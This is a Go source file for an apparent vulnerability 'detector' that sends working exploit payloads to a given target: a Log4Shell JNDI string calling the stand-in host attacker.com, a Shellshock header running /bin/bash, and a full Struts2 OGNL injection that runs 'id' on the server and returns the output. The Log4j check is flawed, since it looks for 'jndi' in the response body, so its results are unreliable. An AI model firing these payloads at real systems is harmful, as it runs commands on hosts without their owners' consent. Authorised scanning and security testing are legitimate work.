package osint

import (
	"net/http"
	"strings"
)

type CVEDetectResult struct {
	Target  string
	CVE     string
	IsVuln  bool
	Payload string
}

type CVEDetect struct {
	Client *http.Client
}

func NewCVEDetect() *CVEDetect {
	return &CVEDetect{Client: &http.Client{}}
}

func (d *CVEDetect) Log4j(target string) CVEDetectResult {
	result := CVEDetectResult{Target: target, CVE: "CVE-2021-44228", IsVuln: false}
	payload := "${jndi:ldap://attacker.com/a}"
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("X-Api-Version", payload)
	resp, err := d.Client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()
	body := make([]byte, 1024)
	resp.Body.Read(body)
	if strings.Contains(string(body), "jndi") {
		result.IsVuln = true
		result.Payload = payload
	}
	return result
}

func (d *CVEDetect) Shellshock(target string) CVEDetectResult {
	result := CVEDetectResult{Target: target, CVE: "CVE-2014-6271", IsVuln: false}
	payload := "() { :;}; /bin/bash -c 'id'"
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", payload)
	resp, err := d.Client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()
	body := make([]byte, 1024)
	resp.Body.Read(body)
	if strings.Contains(string(body), "uid=") {
		result.IsVuln = true
		result.Payload = payload
	}
	return result
}

func (d *CVEDetect) Struts2(target string) CVEDetectResult {
	result := CVEDetectResult{Target: target, CVE: "CVE-2017-5638", IsVuln: false}
	payload := "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	req, _ := http.NewRequest("POST", target, nil)
	req.Header.Set("Content-Type", payload)
	resp, err := d.Client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()
	body := make([]byte, 1024)
	resp.Body.Read(body)
	if strings.Contains(string(body), "uid=") {
		result.IsVuln = true
		result.Payload = payload
	}
	return result
}
